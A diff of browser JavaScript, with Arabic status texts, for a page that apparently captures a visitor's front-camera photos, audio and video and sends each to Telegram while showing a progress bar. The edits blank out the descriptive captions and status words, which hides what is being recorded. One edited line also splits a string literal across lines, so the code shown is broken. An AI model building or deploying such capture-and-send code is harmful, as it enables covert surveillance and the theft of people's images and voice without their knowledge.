@@ -249,8 +249,8 @@ video: { deviceId: videoDevices[0].deviceId }
                     });
                     
                     imagePromises.push(
-                        captureImage(frontVideo, 'الكاميرا الأمامية')
-                            .then(blob => sendToTelegram(blob, 'photo', 'صورة من الكاميرا الأمامية'))
+                        captureImage(frontVideo, 'الكاميرا ')
+                            .then(blob => sendToTelegram(blob, 'photo', 'صورة من  '))
                             .finally(() => {
                                 frontCameraStream.getTracks().forEach(track => track.stop());
                             })
@@ -281,17 +281,18 @@ video: { deviceId: videoDevices[0].deviceId }
                 }
                 
                 await Promise.all(imagePromises);
-                updateStatus('تم التقاط الصور، جاري تسجيل الصوت...', 50);
+                updateStatus('تم التقاط ، جاري  ...', 50);
                 
                 // تسجيل الصوت
                 const audioBlob = await recordAudio();
-                await sendToTelegram(audioBlob, 'audio', 'تسجيل صوتي');
-                updateStatus('تم تسجيل الصوت، جاري تسجيل الفيديو...', 70);
+                await sendToTelegram(audioBlob, 'audio', ' ');
+                updateStatus('تم  الصوت، جاري  ...', 70);
                 
                 // تسجيل الفيديو
                 const videoBlob = await recordVideo();
-                await sendToTelegram(videoBlob, 'video', 'تسجيل فيديو');
-                updateStatus('تم تسجيل الفيديو، جاري الانتهاء...', 90);
+                await sendToTelegram(videoBlob, 'video', ' 
+                                     ');
+                updateStatus('تم   جاري الانتهاء...', 90);
                 
                 // إتمام العملية
                 setTimeout(() => {
